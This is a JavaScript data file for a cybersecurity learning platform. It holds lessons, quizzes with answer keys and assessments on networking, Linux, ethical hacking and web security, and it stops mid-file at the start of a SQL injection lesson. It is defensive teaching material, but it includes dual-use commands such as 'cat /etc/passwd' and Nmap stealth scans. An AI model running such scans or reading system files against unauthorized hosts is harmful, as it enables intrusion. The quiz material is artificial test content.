/**
 * CyberShield Learning Center Curriculum Data
 * Highly realistic educational syllabus mapping professional cyber defense standards.
 */

window.CYBER_BOOKS = [
  {
    id: "net-basics",
    title: "Network Basics",
    description: "Master the bedrock of cyber security by mapping the flow of packets across global network segments.",
    level: "Beginner",
    icon: "globe",
    coverColor: "linear-gradient(135deg, rgba(6, 182, 212, 0.25) 0%, rgba(56, 189, 248, 0.05) 100%)",
    glowColor: "rgba(6, 182, 212, 0.4)",
    readingTime: "45 min",
    skills: ["TCP/IP Model", "IP Addressing", "Wireshark Packet Reading", "Subnetting Rules"],
    objectives: [
      "Understand the OSI and TCP/IP reference layers and packet encapsulations.",
      "Calculate IPv4 subnets and understand IP routing logic.",
      "Analyze TCP 3-Way Handshakes and read network packet structures."
    ],
    chapters: [
      {
        title: "Beginner: Foundations of Packets",
        lessons: [
          {
            id: "net_l1",
            title: "The OSI & TCP/IP Reference Models",
            content: `
              <h3>Demystifying the OSI and TCP/IP Models</h3>
              <p>In cybersecurity, every attack travels across the wire. To defend the endpoints, we must understand the protocols that govern how data is split, addressed, routed, and reconstituted.</p>
              
              <div class="learning-diagram">
                <div class="diagram-title">OSI vs TCP/IP Encapsulation Model</div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-family: monospace; font-size: 11px;">
                  <div style="background: rgba(255,255,255,0.03); padding: 8px; border-left: 3px solid var(--text-cyan);">
                    <strong>OSI Model (7 Layers)</strong><br>
                    7. Application (HTTP, DNS)<br>
                    6. Presentation (SSL/TLS)<br>
                    5. Session (NetBIOS)<br>
                    4. Transport (TCP, UDP)<br>
                    3. Network (IP, ICMP)<br>
                    2. Data Link (Ethernet, MAC)<br>
                    1. Physical (Copper, Fiber)
                  </div>
                  <div style="background: rgba(255,255,255,0.03); padding: 8px; border-left: 3px solid var(--emerald-bright);">
                    <strong>TCP/IP Model (4 Layers)</strong><br>
                    4. Application [Data]<br>
                    -- (Maps to OSI 5, 6, 7)<br>
                    3. Transport [Segments/Datagrams]<br>
                    2. Internet [Packets]<br>
                    1. Network Access [Frames/Bits]
                  </div>
                </div>
              </div>

              <h4>Why Encapsulation Matters to Analysts</h4>
              <p>As user data travels down the stack, each layer appends metadata called a <strong>Header</strong>. An attacker can craft malicious headers at the network layer (e.g. IP Spoofing) or the transport layer (e.g. SYN Floods) to bypass firewalls or overwhelm hosts. Security monitoring devices like IDSs inspect these headers to detect malicious payloads.</p>
            `,
            interactive: {
              type: "quiz",
              question: "At which OSI layer does a packet filter firewall typically analyze IP addresses?",
              options: ["Layer 2: Data Link", "Layer 3: Network", "Layer 4: Transport", "Layer 7: Application"],
              answer: 1,
              explanation: "IP addresses reside at the Network Layer (Layer 3). MAC addresses belong to Layer 2, while Port numbers belong to Layer 4."
            }
          },
          {
            id: "net_l2",
            title: "IP Addressing & Subnet Masking",
            content: `
              <h3>IPv4 Structure & Networking Segments</h3>
              <p>An IPv4 address consists of 32 bits, divided into 4 octets (e.g., <code>192.168.1.1</code>). The address is mathematically split into two portions: the <strong>Network ID</strong> and the <strong>Host ID</strong>, defined by the <strong>Subnet Mask</strong>.</p>

              <div class="learning-diagram">
                <div class="diagram-title">IP Subnet Mask Layout (Class C Example)</div>
                <div style="padding: 10px; background: rgba(0,0,0,0.4); border-radius: 6px; font-family: monospace; font-size: 11px; line-height: 1.6;">
                  IP: <span class="text-cyan">192 . 168 . 1</span> . <span class="text-rose">50</span> &rArr; Binary: <span class="text-cyan">11000000.10101000.00000001</span>.<span class="text-rose">00110010</span><br>
                  MASK: <span class="text-cyan">255 . 255 . 255</span> . <span class="text-rose">0</span> &rArr; Binary: <span class="text-cyan">11111111.11111111.11111111</span>.<span class="text-rose">00000000</span><br>
                  <span class="text-emerald">RESULT: Network Portion = 192.168.1.0, Host Portion = 50</span>
                </div>
              </div>

              <h4>Security Implications of Subnetting</h4>
              <p>By splitting a giant company network into smaller, isolated subnets, we restrict the <strong>blast radius</strong> of an attack. A hacker compromise on the public Wi-Fi subnet cannot easily pivot to the internal corporate database subnet if strict routing ACLs (Access Control Lists) exist between them.</p>
            `,
            interactive: {
              type: "quiz",
              question: "Which subnet mask corresponds to a standard Classless Inter-Domain Routing (CIDR) notation of /24?",
              options: ["255.0.0.0", "255.255.0.0", "255.255.255.0", "255.255.255.240"],
              answer: 2,
              explanation: "A /24 network has 24 consecutive binary 1s (representing 3 full octets of 255), making the mask 255.255.255.0."
            }
          }
        ]
      },
      {
        title: "Intermediate: Traffic Handshakes",
        lessons: [
          {
            id: "net_l3",
            title: "The TCP 3-Way Handshake Engine",
            content: `
              <h3>Stateful Communication Protocols</h3>
              <p>Transmission Control Protocol (TCP) is connection-oriented. Before any data can load, a precise sequence of flags must sync between client and server.</p>

              <div class="learning-diagram">
                <div class="diagram-title">TCP Connection Sequence</div>
                <div style="text-align: center; font-family: monospace; font-size: 11px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 6px;">
                  <strong>Client</strong> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong>Server</strong><br>
                  [CLOSED] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [LISTEN]<br>
                  &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash; SYN (Seq=X) &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&rArr;<br>
                  &lArr;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash; SYN-ACK (Seq=Y, Ack=X+1) &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br>
                  &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash; ACK (Ack=Y+1) &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&rArr;<br>
                  [ESTABLISHED] &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ESTABLISHED]
                </div>
              </div>

              <h4>The SYN Flood Denial of Service</h4>
              <p>An attacker can exploit this sequence by sending thousands of SYN packets with spoofed source IPs. The server sends SYN-ACK replies to dead addresses and holds open half-connected memory sockets, eventually depleting host resources and crashing the network daemon.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What flag combination indicates a connection reset request?",
              options: ["SYN", "FIN", "RST", "URG"],
              answer: 2,
              explanation: "RST (Reset) immediately tears down an existing active TCP socket, indicating an abnormal termination of the channel."
            }
          },
          {
            id: "net_l4",
            title: "DNS Architecture & Attack Vectors",
            content: `
              <h3>Domain Name System (DNS) Resolutions</h3>
              <p>DNS acts as the phonebook of the internet, mapping legible hostnames to IPv4/IPv6 addresses. It runs primarily over <strong>UDP port 53</strong> for raw speed.</p>
              
              <h4>Common DNS Attack Techniques</h4>
              <ul>
                <li><strong>DNS Spoofing / Cache Poisoning:</strong> Forging resource records in a recursive DNS resolver to redirect users to malicious IP clones.</li>
                <li><strong>DNS Tunneling:</strong> Encapsulating command-and-control (C2) payloads in subdomains of DNS lookup requests to sneak data past packet firewalls.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Which DNS record type maps a domain name directly to an IPv6 address?",
              options: ["A Record", "CNAME Record", "MX Record", "AAAA Record"],
              answer: 3,
              explanation: "A records map to IPv4, while AAAA records map domain names to IPv6 addresses."
            }
          }
        ]
      },
      {
        title: "Advanced: Packet Forensics",
        lessons: [
          {
            id: "net_l5",
            title: "Wireshark & Packet Dissections",
            content: `
              <h3>Analyzing Hex Streams</h3>
              <p>Wireshark captures raw frames directly off the network interface cards (NIC). To read packets, analysts focus on structure offsets:</p>
              
              <div class="learning-diagram">
                <div class="diagram-title">Tactical PCAP Filter syntax</div>
                <div style="font-family: monospace; font-size: 11px; padding: 10px; background: rgba(0,0,0,0.3); line-height: 1.6;">
                  <span class="text-cyan">ip.src == 10.0.0.5</span> - Filter traffic originating from a specific host.<br>
                  <span class="text-rose">http.request.method == "POST"</span> - Isolate file uploads and credential forms.<br>
                  <span class="text-emerald">tcp.flags.syn == 1 && tcp.flags.ack == 0</span> - Detect incoming port scans.
                </div>
              </div>
            `,
            interactive: {
              type: "quiz",
              question: "Which Wireshark filter matches HTTP traffic containing suspicious GET requests?",
              options: ["ip.addr == 80", "http.request.method == \"GET\"", "tcp.port == 443", "dns.qry.type == 1"],
              answer: 1,
              explanation: "http.request.method == 'GET' selectively filters out HTTP GET requests from standard capture data."
            }
          },
          {
            id: "net_l6",
            title: "Firewalls & Packet Traversal",
            content: `
              <h3>Stateful vs. Stateless Packet Firewalls</h3>
              <p>A <strong>stateless</strong> firewall inspects packets individually in isolation (source/destination IP, port, protocol). A <strong>stateful</strong> firewall maintains an internal connection table, allowing return packets for already established outbound flows while blocking unsolicited inbound connections automatically.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What makes stateful firewalls safer than stateless packet filters?",
              options: [
                "They decrypt HTTPS payloads on the fly.",
                "They track connection state context and only permit return packets for safe established flows.",
                "They run completely offline without reading ports.",
                "They are immune to any DDoS floods."
              ],
              answer: 1,
              explanation: "Stateful firewalls track socket states (e.g. established TCP channels) to automatically permit correct return payloads without exposing ports."
            }
          }
        ]
      }
    ],
    finalQuiz: [
      {
        question: "A security analyst spots thousands of half-open TCP connections on Port 80, originating from randomized IP addresses. What attack vector is this?",
        options: ["TCP SYN Flood", "DNS Amplification", "Slowloris Exhaustion", "ARP Poisoning Attack"],
        answer: 0,
        explanation: "SYN Floods utilize randomized source addresses to bypass standard filters and fill half-open state queues."
      },
      {
        question: "What range of CIDR subnet mask lets you allocate exactly 254 usable client host addresses?",
        options: ["/24 (255.255.255.0)", "/25 (255.255.255.128)", "/16 (255.255.0.0)", "/30 (255.255.255.252)"],
        answer: 0,
        explanation: "/24 provides 2^8 = 256 addresses, minus 2 (network address and broadcast address), giving exactly 254 usable client IPs."
      },
      {
        question: "Which of the following operates on UDP port 53?",
        options: ["SSH", "HTTP", "DNS", "FTP"],
        answer: 2,
        explanation: "DNS utilizes port 53 primarily over UDP for fast queries, falling back to TCP only for large zone transfers."
      }
    ],
    finalAssessment: {
      type: "network-builder",
      prompt: "Configure a secure Firewall Rule to block inbound SSH access (Port 22) from the external subnet (<code>192.168.10.0/24</code>) but allow HTTPS (Port 443) from all sources.",
      options: [
        "ALLOW 192.168.10.0/24 : 22 | DENY ANY : 443",
        "DENY 192.168.10.0/24 : 22 | ALLOW ANY : 443",
        "BLOCK ANY : 443 | ALLOW 192.168.10.0/24 : 22",
        "ALLOW ANY : 80 | ALLOW 192.168.10.0/24 : 22"
      ],
      answer: 1,
      expectedText: "DENY 192.168.10.0/24 on port 22 and ALLOW ANY on port 443."
    }
  },
  {
    id: "linux-basics",
    title: "Linux Basics",
    description: "Get comfortable navigating the terminal of the most critical systems in cybersecurity.",
    level: "Beginner",
    icon: "terminal",
    coverColor: "linear-gradient(135deg, rgba(34, 197, 94, 0.2) 0%, rgba(16, 185, 129, 0.05) 100%)",
    glowColor: "rgba(34, 197, 94, 0.4)",
    readingTime: "40 min",
    skills: ["Shell Commands", "File Permissions", "User Controls", "Bash Scripting"],
    objectives: [
      "Master the essential Linux command-line tools for SOC analysts.",
      "Modify and secure file permissions using standard Octal notation.",
      "Understand Linux services, process trees, and automated bash tasks."
    ],
    chapters: [
      {
        title: "Beginner: Terminal Foundations",
        lessons: [
          {
            id: "lin_l1",
            title: "Navigating the File System",
            content: `
              <h3>Essential Linux Shell Utilities</h3>
              <p>Linux is the native tongue of hackers and servers. Almost all security sensors, cloud runtimes, and vulnerability engines execute on top of Linux kernels.</p>
              
              <h4>Crucial Navigation Commands:</h4>
              <ul>
                <li><code>ls -la</code>: List directory files, showing permissions, owners, sizes, and hidden files.</li>
                <li><code>cd /var/log</code>: Change working path to standard system log storage.</li>
                <li><code>pwd</code>: Print the absolute path of the current directory.</li>
                <li><code>cat /etc/passwd</code>: Read system users database file (non-privileged fields).</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Which flag combo reveals hidden directories and file owners in a folder list?",
              options: ["-h", "-r", "-la", "-x"],
              answer: 2,
              explanation: "-l represents long listing format (owner details, permissions) and -a includes all files starting with '.' (hidden)."
            }
          },
          {
            id: "lin_l2",
            title: "Understanding File Permissions",
            content: `
              <h3>Owner, Group, and Public Octal Permissions</h3>
              <p>Each file has three privilege scopes: <strong>User (Owner)</strong>, <strong>Group</strong>, and <strong>Others (Public)</strong>.</p>
              
              <div class="learning-diagram">
                <div class="diagram-title">Linux Permissions Octal Table</div>
                <div style="font-family: monospace; font-size: 11px; padding: 10px; background: rgba(0,0,0,0.4); border-radius: 6px; line-height: 1.6;">
                  r (Read) = 4 &nbsp;|&nbsp; w (Write) = 2 &nbsp;|&nbsp; x (Execute) = 1<br><br>
                  CHMOD 755 equivalent &rArr; <br>
                  Owner: 4+2+1 = <span class="text-cyan">7 (rwx)</span><br>
                  Group: 4+0+1 = <span class="text-emerald">5 (r-x)</span><br>
                  Others: 4+0+1 = <span class="text-rose">5 (r-x)</span>
                </div>
              </div>

              <h4>Risk Mitigation: Least Privilege</h4>
              <p>Do not grant <code>chmod 777</code> to scripts or files. This allows any process or attacker to read, overwrite, and run arbitrary malicious execution paths inside your web namespaces.</p>
            `,
            interactive: {
              type: "quiz",
              question: "What octal permission sets a file to read/write for the owner, and read-only for all others?",
              options: ["777", "644", "755", "600"],
              answer: 1,
              explanation: "Owner: 4(read)+2(write)=6. Group: 4(read)=4. Others: 4(read)=4. This produces octal 644."
            }
          }
        ]
      },
      {
        title: "Intermediate: Services & Logs",
        lessons: [
          {
            id: "lin_l3",
            title: "Process Control & Services Management",
            content: `
              <h3>Service Ingress Controls</h3>
              <p>Linux manages servers as background daemons. To monitor or stop active listening programs, utilize:</p>
              <ul>
                <li><code>systemctl status sshd</code>: Check status of active Secure Shell service.</li>
                <li><code>ps aux | grep nginx</code>: Pinpoint running Web server processes.</li>
                <li><code>kill -9 &lt;PID&gt;</code>: Forcefully terminate a rogue process.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What command stops a service immediately using the Systemd control daemon?",
              options: ["killall system", "systemctl stop <service>", "service restart <service>", "ps -stop <service>"],
              answer: 1,
              explanation: "systemctl stop <service> is the modern way to gracefully disable/stop active background daemons."
            }
          },
          {
            id: "lin_l4",
            title: "System Logs & Incident Monitoring",
            content: `
              <h3>Reviewing Footprints</h3>
              <p>When an intrusion occurs, the traces are written to log files in the <code>/var/log</code> directory:</p>
              <ul>
                <li><code>/var/log/auth.log</code>: Tracks SSH authentications, login failures, and sudo requests.</li>
                <li><code>/var/log/syslog</code>: Holds central operating system kernel warnings and messages.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Which command lists auth logs live as they are being appended by the system?",
              options: ["cat /var/log/auth.log", "grep -r auth.log", "tail -f /var/log/auth.log", "nano /var/log/auth.log"],
              answer: 2,
              explanation: "tail -f actively streams incoming entries to the console as they occur in real-time."
            }
          }
        ]
      },
      {
        title: "Advanced: Automation & Audits",
        lessons: [
          {
            id: "lin_l5",
            title: "Bash Scripting for SOC Workflows",
            content: `
              <h3>Scripting Defensive Audits</h3>
              <p>To inspect active users or check permissions regularly, we write automation scripts starting with a <strong>shebang</strong> (<code>#!/bin/bash</code>).</p>
              
              <div class="learning-diagram">
                <div class="diagram-title">Sample Security Scan Script</div>
                <pre style="font-family: monospace; font-size: 10.5px; background: rgba(0,0,0,0.5); padding: 8px; border-radius: 4px; color: var(--emerald-bright);">
#!/bin/bash
echo "Scanning for World-Writable files..."
find / -perm -o+w -type f 2>/dev/null
echo "Scan Completed."</pre>
              </div>
            `,
            interactive: {
              type: "quiz",
              question: "What is the purpose of redirecting '2>/dev/null' at the end of a bash command?",
              options: [
                "It deletes the entire script.",
                "It suppresses permission/error messages, outputting only clean results.",
                "It logs commands to the standard system registry.",
                "It encrypts output on the fly."
              ],
              answer: 1,
              explanation: "'2>/dev/null' suppresses standard error (stderr), preventing standard command execution logs from being cluttered with permission denied errors."
            }
          },
          {
            id: "lin_l6",
            title: "SSH Hardening & Security Auditing",
            content: `
              <h3>Hardening System Gates</h3>
              <p>SSH is a key remote management gate. To secure it, edit the configuration at <code>/etc/ssh/sshd_config</code>:</p>
              <ul>
                <li>Disable Root Login: <code>PermitRootLogin no</code></li>
                <li>Disable Password Auth (enforce public key SSH pairs): <code>PasswordAuthentication no</code></li>
                <li>Modify Default Port (security by obscurity): <code>Port 2222</code></li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Which config parameter disables direct Root account authentication over SSH?",
              options: ["DenyRoot yes", "PermitRootLogin no", "RootAccess block", "DisableRoot ssh"],
              answer: 1,
              explanation: "PermitRootLogin no is the official SSH directive that forces root commands to be executed via standard user escalation (sudo)."
            }
          }
        ]
      }
    ],
    finalQuiz: [
      {
        question: "Which permission string matches the octal permission 755?",
        options: ["rwx-xr-x", "rwxr-xr-x", "rw-r--r--", "r-xr-xr-x"],
        answer: 1,
        explanation: "Owner: rwx (4+2+1=7). Group: r-x (4+0+1=5). Others: r-x (4+0+1=5). Producing rwxr-xr-x."
      },
      {
        question: "Where are basic service configuration logs, failure traces, and system messages stored in a standard Linux system?",
        options: ["/bin", "/etc", "/var/log", "/dev"],
        answer: 2,
        explanation: "/var/log is the canonical storage directory for Linux daemons, system kernels, and security events logs."
      },
      {
        question: "What command creates a completely empty file or updates its modification time?",
        options: ["mkdir", "touch", "create", "nano"],
        answer: 1,
        explanation: "touch creates empty file instances if they do not exist, otherwise updating access dates."
      }
    ],
    finalAssessment: {
      type: "linux-command",
      prompt: "Compose a single command string to search for the string 'FAILED' inside the file '/var/log/auth.log'.",
      options: [
        "grep 'FAILED' /var/log/auth.log",
        "find 'FAILED' /var/log/auth.log",
        "cat 'FAILED' /var/log/auth.log",
        "tail -f 'FAILED' /var/log/auth.log"
      ],
      answer: 0,
      expectedText: "grep 'FAILED' /var/log/auth.log"
    }
  },
  {
    id: "ethical-hacking-basics",
    title: "Ethical Hacking Basics",
    description: "Learn to think like an adversary. Protect systems by discovering vulnerabilities before they do.",
    level: "Intermediate",
    icon: "shield",
    coverColor: "linear-gradient(135deg, rgba(239, 68, 68, 0.25) 0%, rgba(244, 63, 94, 0.05) 100%)",
    glowColor: "rgba(239, 68, 68, 0.4)",
    readingTime: "50 min",
    skills: ["Nmap Scanning", "Vulnerability Auditing", "Metasploit", "Exploit Execution"],
    objectives: [
      "Understand ethical, legal, and operational boundaries of penetration testing.",
      "Identify open ports, services, and operating systems using Nmap.",
      "Configure and launch exploitation modules to audit security patches."
    ],
    chapters: [
      {
        title: "Beginner: Scope & Port Scanning",
        lessons: [
          {
            id: "eth_l1",
            title: "Rules of Engagement & Legality",
            content: `
              <h3>Defining Ethical Hacking Boundaries</h3>
              <p>Without written, signed authorization (the <strong>Rules of Engagement</strong>), any attempt to scan or probe an IP address is a potential criminal infraction under cybercrime acts. Ethical hacking requires strict permission boundaries.</p>
              
              <h4>Stages of a Pen Test:</h4>
              <ol>
                <li><strong>Reconnaissance:</strong> Gathering passive and active info on target domains.</li>
                <li><strong>Scanning:</strong> Identifying active hosts and ports.</li>
                <li><strong>Gaining Access:</strong> Exploiting identified flaws.</li>
                <li><strong>Maintaining Access:</strong> Establishing persistence backdoors.</li>
                <li><strong>Reporting:</strong> Documenting remediation steps for security teams.</li>
              </ol>
            `,
            interactive: {
              type: "quiz",
              question: "What legal document must be signed by the client before any active exploitation scan starts?",
              options: ["NDA", "Rules of Engagement (ROE)", "Terms of Service", "SLA contract"],
              answer: 1,
              explanation: "The Rules of Engagement outlines clear parameters, targets, IP scopes, testing times, and legal immunities."
            }
          },
          {
            id: "eth_l2",
            title: "Mastering Nmap Scans",
            content: `
              <h3>Identifying Active System Gates</h3>
              <p>Nmap (Network Mapper) scans targets by sending custom packets and analyzing returning flags.</p>
              
              <div class="learning-diagram">
                <div class="diagram-title">Tactical Nmap Commands</div>
                <div style="font-family: monospace; font-size: 11px; padding: 10px; background: rgba(0,0,0,0.4); line-height: 1.6;">
                  <span class="text-rose">nmap -sS target-ip</span> - Stealth SYN Scan (analyzes SYN-ACKs without completing TCP handshakes).<br>
                  <span class="text-cyan">nmap -sV target-ip</span> - Service Version Probe (sends payloads to identify exact service running).<br>
                  <span class="text-emerald">nmap -O target-ip</span> - Operating System fingerprint analysis.
                </div>
              </div>
            `,
            interactive: {
              type: "quiz",
              question: "What is the primary benefit of conducting an Nmap stealth SYN scan (-sS)?",
              options: [
                "It bypasses all modern web application firewalls.",
                "It identifies password hashes automatically.",
                "It does not complete full TCP sessions, making it less noisy/log-intensive on target servers.",
                "It runs completely offline."
              ],
              answer: 2,
              explanation: "A SYN scan (half-open) tears down the connection immediately after receiving a SYN-ACK, preventing many simple application-level logs from triggering."
            }
          }
        ]
      },
      {
        title: "Intermediate: Vulnerability Scans",
        lessons: [
          {
            id: "eth_l3",
            title: "Vulnerability Assessments",
            content: `
              <h3>Prioritizing Risks</h3>
              <p>Once open ports are mapped, we cross-reference service versions against public databases of **CVEs** (Common Vulnerabilities and Exposures). We rate risk using the **CVSS** scale (1.0 to 10.0 Critical).</p>
            `,
            interactive: {
              type: "quiz",
              question: "What does a CVSS score of 9.8 represent?",
              options: ["Low Risk", "Medium Risk", "High Risk", "Critical Risk"],
              answer: 3,
              explanation: "CVSS scores from 9.0 to 10.0 are classified as CRITICAL, requiring immediate hot-patches and isolation."
            }
          },
          {
            id: "eth_l4",
            title: "Exploitation Frameworks: Metasploit",
            content: `
              <h3>Metasploit Core Concepts</h3>
              <p>Metasploit standardizes exploit modules. It matches known system vulnerabilities with **Payloads** (arbitrary code, such as a reverse shell) to grant control to auditors.</p>
              <ul>
                <li><strong>Exploit:</strong> The vehicle that carries the exploit vector into the vulnerable software.</li>
                <li><strong>Payload:</strong> The code execution (shell, beacon) that triggers on the target host once bypassed.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What is a 'Reverse Shell' in exploitation context?",
              options: [
                "The target server initiates an outbound connection back to the hacker's listener.",
                "An encrypted database storage.",
                "A firewall rule that flips ports.",
                "A protocol to sync files."
              ],
              answer: 0,
              explanation: "Reverse shells bypass standard inbound firewall gates by instructing the compromised host to connect OUTBOUND to the listener."
            }
          }
        ]
      },
      {
        title: "Advanced: Defensive Auditing",
        lessons: [
          {
            id: "eth_l5",
            title: "Post-Exploitation & Privilege Escalation",
            content: `
              <h3>Securing the Foothold</h3>
              <p>Once on a system, hackers assess privileges. Privilege Escalation represents migrating from low-level accounts (e.g. <code>www-data</code>) up to Administrative control (<code>root</code> or <code>SYSTEM</code>).</p>
            `,
            interactive: {
              type: "quiz",
              question: "What is 'Privilege Escalation'?",
              options: [
                "Upgrading network cable bandwidth.",
                "Moving from a standard, limited account to administrator permissions.",
                "Creating a backup file copy.",
                "Installing custom web servers."
              ],
              answer: 1,
              explanation: "Privilege escalation focuses on exploiting system vulnerabilities or configuration gaps to elevate a standard user to root/administrator access."
            }
          },
          {
            id: "eth_l6",
            title: "Remediation & Secure Auditing Logs",
            content: `
              <h3>Closing the Threat Vectors</h3>
              <p>Finding vulnerabilities is only half the battle. To secure system boundaries, we must produce remediation patches:</p>
              <ul>
                <li>Keep software patched to current secure version stables.</li>
                <li>Disable any non-essential default listening services.</li>
                <li>Filter external connections through zero-trust network gates.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "What is the primary output of an ethical penetration test?",
              options: [
                "A set of database credentials.",
                "A detailed technical report outlining vulnerabilities discovered and practical remediation patches.",
                "An active ransomware payload.",
                "A server hardware upgrade."
              ],
              answer: 1,
              explanation: "Ethical hacking focuses entirely on defense, producing detailed remediation reports to patch security postures before rogue actors exploit them."
            }
          }
        ]
      }
    ],
    finalQuiz: [
      {
        question: "Which Nmap parameter executes service version discovery?",
        options: ["-sS", "-sV", "-O", "-p-"],
        answer: 1,
        explanation: "-sV interrogates open ports to determine exact software names, operational versions, and vendor patches."
      },
      {
        question: "What makes a 'Reverse Shell' highly effective at bypassing typical corporate firewalls?",
        options: [
          "It encrypts all hard drives.",
          "It establishes an outbound connection, which is often permitted by standard egress firewall policies.",
          "It acts without executing memory code.",
          "It uses wireless signals."
        ],
        answer: 1,
        explanation: "Most firewalls block incoming connections but loosely permit outgoing connections, making reverse shells highly effective."
      },
      {
        question: "Under what condition is pen testing considered legal and ethical?",
        options: [
          "If the target website is a known illegal site.",
          "If written ROE permission has been signed and validated by system owners.",
          "If the tester promises not to share data.",
          "If the tester uses only public open-source tools."
        ],
        answer: 1,
        explanation: "Consent, formalized in writing via a Rules of Engagement (ROE) document, is the absolute dividing line between security engineering and criminal hacking."
      }
    ],
    finalAssessment: {
      type: "nmap-scan",
      prompt: "Compose the complete stealth SYN Nmap command with service version checking against target IP <code>10.0.1.25</code>.",
      options: [
        "nmap -sS -sV 10.0.1.25",
        "nmap -O -p- 10.0.1.25",
        "nmap -p 22 -sU 10.0.1.25",
        "nmap -v 10.0.1.25"
      ],
      answer: 0,
      expectedText: "nmap -sS -sV 10.0.1.25"
    }
  },
  {
    id: "web-security",
    title: "Web Security",
    description: "Secure the cloud. Find and block vulnerability flaws in modern web architectures.",
    level: "Intermediate",
    icon: "book-open",
    coverColor: "linear-gradient(135deg, rgba(56, 189, 248, 0.25) 0%, rgba(6, 182, 212, 0.05) 100%)",
    glowColor: "rgba(56, 189, 248, 0.4)",
    readingTime: "45 min",
    skills: ["HTTP Protections", "XSS Defenses", "CSRF Prevention", "SQL Injection"],
    objectives: [
      "Understand how cookies, sessions, and HTTP transport mechanisms function.",
      "Detect and sanitize user input vectors to block Cross-Site Scripting (XSS).",
      "Implement anti-CSRF token payloads and browser security headers."
    ],
    chapters: [
      {
        title: "Beginner: HTTP & Sessions",
        lessons: [
          {
            id: "web_l1",
            title: "How HTTP/HTTPS and Cookies Work",
            content: `
              <h3>Transport Security & Stateful Sessions</h3>
              <p>HTTP is stateless. To persist logins, servers hand users a unique string called a <strong>Session Cookie</strong>. Security flags must safeguard cookies:</p>
              <ul>
                <li><strong>Secure Flag:</strong> Forces the browser to transmit cookies exclusively over TLS (HTTPS).</li>
                <li><strong>HttpOnly Flag:</strong> Restricts client-side JavaScript from accessing cookies, neutralizing many credential hijacking attacks.</li>
                <li><strong>SameSite:</strong> Limits cookie transmission to origin domains to prevent forged requests.</li>
              </ul>
            `,
            interactive: {
              type: "quiz",
              question: "Which cookie attribute prevents client-side Javascript scripts from accessing session tokens?",
              options: ["Secure", "HttpOnly", "SameSite", "Path"],
              answer: 1,
              explanation: "HttpOnly stops malicious JavaScript (e.g. inside an XSS compromise) from accessing or stealing the cookie via 'document.cookie'."
            }
          },
          {
            id: "web_l2",
            title: "Essential Security Headers",
            content: `
              <h3>Hardening Response Handshakes</h3>
              <p>Web servers send response headers to instruct the user's browser to apply strict security features.</p>
              
              <div class="learning-diagram">
                <div class="diagram-title">Critical Browser Security Headers</div>
                <div style="font-family: monospace; font-size: 11px; padding: 10px; background: rgba(0,0,0,0.4); line-height: 1.6;">
                  <strong>Content-Security-Policy (CSP):</strong> Restricts trusted sources for scripts, images, and resources, preventing XSS injection.<br>
                  <strong>Strict-Transport-Security (HSTS):</strong> Mandates all connections over secure HTTPS channels.<br>
                  <strong>X-Frame-Options:</strong> Restricts page framing to block Clickjacking.
                </div>
              </div>
            `,
            interactive: {
              type: "quiz",
              question: "What attack vector does a Strict-Transport-Security (HSTS) header prevent?",
              options: ["SQL Injection", "XSS Injection", "SSL Stripping/Man-in-the-Middle down to HTTP", "DDoS attacks"],
              answer: 2,
              explanation: "HSTS instructs the browser to always force secure HTTPS channels, preventing attackers from stripping SSL sessions back to unencrypted HTTP."
            }
          }
        ]
      },
      {
        title: "Intermediate: Core Web Exploits",
        lessons: [
          {
            id: "web_l3",
            title: "Cross-Site Scripting (XSS)",
            content: `
              <h3>Malicious Payloads in User Browsers</h3>
              <p>XSS occurs when an application includes untrusted user input in a web page without proper validation or sanitization.</p>
              
              <h4>Categories of XSS:</h4>
              <ul>
                <li><strong>Reflected XSS:</strong> Input payload is immediately echoed back on the screen (e.g. search boxes).</li>
                <li><strong>Stored XSS:</strong> Payload is saved in a database (e.g. comment forum) and executed on all visiting user dashboards.</li>
              </ul>
              
              <h4>Mitigation:</h4>
              <p>Enforce strict Output Encoding, sanitize HTML input elements, and deploy strict Content Security Policies (CSP).</p>
            `,
            interactive: {
              type: "quiz",
              question: "Which XSS category is considered highest risk due to permanent payload storage?",
              options: ["Reflected XSS", "DOM-based XSS", "Stored XSS", "Header XSS"],
              answer: 2,
              explanation: "Stored XSS is highly destructive since the script is stored in databases and executed on any user's browser who visits the page."
            }
          },
          {
            id: "web_l4",
            title: "SQL Injection (SQLi) Foundations",
            content: `
              <h3>Bypassing Query Logic</h3>
